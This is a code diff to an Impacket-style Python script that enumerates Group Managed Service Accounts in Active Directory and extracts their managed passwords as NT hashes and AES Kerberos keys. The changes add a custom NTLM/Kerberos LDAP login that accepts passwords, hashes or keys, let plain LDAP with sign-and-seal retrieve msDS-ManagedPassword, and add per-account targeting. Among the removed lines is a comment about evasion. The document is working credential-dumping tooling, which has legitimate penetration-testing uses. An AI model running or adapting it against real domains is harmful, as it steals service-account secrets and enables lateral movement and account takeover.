@@ -10,19 +10,17 @@
 # for more information.
 #
 # Description:
-#   Queries Active Directory via LDAP to enumerate all Group Managed Service
-#   Accounts (gMSAs) and when LDAPS/TLS is available, dumps their managed
-#   password as NT hash, AES-128, and AES-256 kerberos keys.
+#   Queries Active Directory via LDAP to enumerate all or a specific/target Group Managed Service
+#   Accounts (gMSAs) and dumps their managed password as NT hash, AES-128, and AES-256 kerberos keys.
+#   Can be used to only enumerate, using the -enum flag. Additionally you can use -gmsa to specify a specific object
+#   or using wildcard.
 #
-#   Without TLS (plain LDAP) the msDS-ManagedPassword attribute is not
-#   returned by the DC, so only the ACL membership (which principals are
-#   authorised to retrieve the password) is displayed. It is possible to do this without LDAPS
-# TODO: Implement the ability to get the passwords even if theres no LDAPS as thats possible with other tools like bloodyAD
+#
 #
 # Author:
-#   Abdul Mhanni
+#   Abdul Mhanni And Alexander Chin-Lenn
 #
-# Inspired by / based on the following. I heavily took from these from actual content to formating style etc:
+# Inspired by / based on the following(Note we heavily took from these from actual content to formating style etc):
 #   Alberto Solino (@agsolino) - GetAdUsers
 #   Fowz Masood - GetADComputers
 #   micahvandeusen - gMSADumper (https://github.com/micahvandeusen/gMSADumper)
@@ -45,7 +43,7 @@ from Cryptodome.Hash import MD4
 
 from impacket import version
 from impacket.examples import logger
-from impacket.examples.utils import parse_identity, ldap_login
+from impacket.examples.utils import parse_identity
 from impacket.krb5 import constants
 from impacket.krb5.crypto import string_to_key
 from impacket.ldap import ldap, ldapasn1
@@ -133,6 +131,7 @@ class GetGMSAPasswords:
         self.__kdcIP        = cmdLineOptions.dc_ip
         self.__kdcHost      = cmdLineOptions.dc_host
         self.__useLdaps     = cmdLineOptions.use_ldaps
+        self.__enumOnly     = cmdLineOptions.enum_only
         # either a specific gMSA name (wildcards allowed) or a
         # raw LDAP filter string supplied by the operator
         self.__gmsaName     = cmdLineOptions.gmsa        #you can use 'svcWeb$' or 'svc*'
@@ -145,10 +144,10 @@ class GetGMSAPasswords:
         self.baseDN = ','.join('dc=%s' % part for part in self.__domain.split('.'))
 
         # Live connection reference — needed for secondary SID-resolution lookups
-        
         self.__ldapConn = None
 
-        # Tracks whether STARTTLS was successfully negotiated since I dont really want to access for the GMSA password unless its absolutely neccesary
+        # Tracks whether the channel is confidential (LDAPS, or NTLM session security ENCRYPT)
+        # The DC will only return msDS-ManagedPassword over a confidential channel.
         self.__tlsActive = False
 
     
@@ -215,24 +214,28 @@ class GetGMSAPasswords:
 
     def _resolve_sid(self, sid_canonical):
         
+        results = []
+
+        def _collect(item):
+            if isinstance(item, ldapasn1.SearchResultEntry):
+                results.append(item)
+
         try:
-            resp = self.__ldapConn.search(
+            self.__ldapConn.search(
+                self.baseDN,
                 searchFilter='(objectSid={})'.format(sid_canonical),
-                attributes=['sAMAccountName', 'name', 'cn', 'objectClass'],
+                attributes=['sAMAccountName', 'name', 'cn'],
+                perRecordCallback=_collect,
             )
-
-            for item in resp:
-                if not isinstance(item, ldapasn1.SearchResultEntry):
-                    continue
-
-                sam = self._attr_value(item['attributes'], 'sAMAccountName')
-                name = self._attr_value(item['attributes'], 'name')
-                cn = self._attr_value(item['attributes'], 'cn')
-
-                resolved_name = sam or name or cn
-                if resolved_name:
-                    return '{} ({})'.format(resolved_name, sid_canonical)
-
+            if results:
+                attrs = results[0]['attributes']
+                resolved = (
+                    self._attr_value(attrs, 'sAMAccountName') or
+                    self._attr_value(attrs, 'name') or
+                    self._attr_value(attrs, 'cn')
+                )
+                if resolved:
+                    return '{} ({})'.format(resolved, sid_canonical)
         except Exception as exc:
             logging.debug('SID resolution error for %s: %s', sid_canonical, exc)
 
@@ -313,8 +316,8 @@ class GetGMSAPasswords:
                     print('    [-] msDS-ManagedPassword not returned '
                           '(this account may not be authorised to read it)')
                 else:
-                    print('    [-] msDS-ManagedPassword requires LDAPS '
-                          '(use -use-ldaps or make sure TLS is enabled on the DC)')
+                    print('    [-] msDS-ManagedPassword requires a confidential channel '
+                          '(use -use-ldaps, or ensure NTLM session security is active)')
 
         except Exception as exc:
             logging.debug('Exception in processGMSAEntry()', exc_info=True)
@@ -322,17 +325,7 @@ class GetGMSAPasswords:
 
 
     def _build_GMSA_locate_filter(self):
-        """
-        here building the LDAP filter used to find gMSA objects.
-
-        If -gmsa-filter is set, we use that and force objectClass to
-        msDS-GroupManagedServiceAccount.
-
-        If -gmsa is set, we search by sAMAccountName. Wildcards are left
-        alone, and a trailing '$' is added if the caller didnt add one.
-
-        default is non of these are set and so we will return a filter that matches all gMSAs.
-        """
+        
         base = '(objectClass=msDS-GroupManagedServiceAccount)'
 
         if self.__gmsaFilter:
@@ -349,54 +342,65 @@ class GetGMSAPasswords:
        
         return '(&{})'.format(base)
 
-    def run(self):
+    def ldap_auth(self):
+        
+        target = self.__kdcIP or self.__kdcHost or self.__domain
+        self.__target = target
+
+        scheme  = 'ldaps' if self.__useLdaps else 'ldap'
+        url     = '{}://{}'.format(scheme, target)
+        basedn  = self.baseDN
+
+        logging.debug('[*] Connecting to %s', url)
+        ldapConn = ldap.LDAPConnection(url, basedn, self.__kdcIP)
+
+        if self.__doKerberos:
+            logging.debug('[*] Authenticating with Kerberos')
+            ldapConn.kerberosLogin(
+                self.__username, self.__password, self.__domain,
+                self.__lmhash, self.__nthash, self.__aesKey,
+                kdcHost=self.__kdcIP,
+            )
+        else:
+            logging.debug('[*] Authenticating with NTLM')
+            ldapConn.login(
+                self.__username, self.__password, self.__domain,
+                self.__lmhash, self.__nthash,
+            )
+
+        return ldapConn
     
-        self.__ldapConn = ldap_login(
-            self.__target,
-            self.baseDN,
-            self.__kdcIP,
-            self.__kdcHost,
-            self.__doKerberos,
-            self.__username,
-            self.__password,
-            self.__domain,
-            self.__lmhash,
-            self.__nthash,
-            self.__aesKey,
-            ldaps_flag=self.__useLdaps,
-        )
-        # ldap_login may rewrite the target host during negotiation
-        self.__target = self.__ldapConn._dstHost
+
+    def run(self):
+        
+        try:
+            self.__ldapConn = self.ldap_auth()
+        except Exception as e:
+            logging.error('Authentication failed: %s', e)
+            sys.exit(1)
 
         
-        #Optionally upgrade to TLS
+        self.__tlsActive = True
         if self.__useLdaps:
-            try:
-                self.__tlsActive = True
-                logging.info('STARTTLS negotiated — msDS-ManagedPassword will be retrieved.')
-            except Exception as exc:
-                logging.warning(
-                    'STARTTLS failed (%s). '
-                    'Only ACL membership will be shown. '
-                    'Managed passwords require a TLS-protected connection.',
-                    exc,
-                )
+            logging.info('[+] Using LDAPS (port 636).')
+        else:
+            logging.info('[+] Using plain LDAP with NTLM Sign+Seal.')
 
         logging.info('Querying %s for gMSA objects.', self.__target)
 
-        # Only request the password attribute when TLS is active as the DC will silently omit it over plain LDAP regardless.
-        # Particualrly useful for evasion as we dont want to preform uneccesary actions if it can be helped
+    
         attrs = ['sAMAccountName', 'msDS-GroupMSAMembership']
-        if self.__tlsActive:
+        if not self.__enumOnly:
             attrs.append('msDS-ManagedPassword')
 
         search_filter = self._build_GMSA_locate_filter()
         logging.debug('Search filter: %s', search_filter)
         logging.debug('Attributes requested: %s', attrs)
 
+        sc = ldap.SimplePagedResultsControl(size=100)
         try:
-            sc = ldap.SimplePagedResultsControl(size=100)
             self.__ldapConn.search(
+                self.baseDN,
                 searchFilter=search_filter,
                 attributes=attrs,
                 sizeLimit=0,
@@ -405,12 +409,9 @@ class GetGMSAPasswords:
             )
         except ldap.LDAPSearchError as exc:
             if exc.error == 0:
-        
                 logging.info('No gMSA objects found in the directory.')
             else:
                 raise
-
-        self.__ldapConn.close()
 
 
 if __name__ == '__main__':
@@ -420,8 +421,8 @@ if __name__ == '__main__':
     parser.add_argument('target', action='store', help='domain[/username[:password]]')
     parser.add_argument('-ts', action='store_true', help='Adds timestamp to every logging output')
     parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
-    parser.add_argument('-use-ldaps', action='store_true', default=True, help='Try STARTTLS to get msDS-ManagedPassword')
-    parser.add_argument('-no-ldaps', action='store_false', dest='use_ldaps', help='Only show ACL readers')
+    parser.add_argument('-use-ldaps', action='store_true', default=False, help='Connect via LDAPS (port 636) instead of plain LDAP.')
+    parser.add_argument('-enum', action='store_true', dest='enum_only', help='ACL enumeration only show which principals can read each gMSA password, without credential extraction')
 
     group = parser.add_argument_group('targeting')
     group2 = group.add_mutually_exclusive_group()
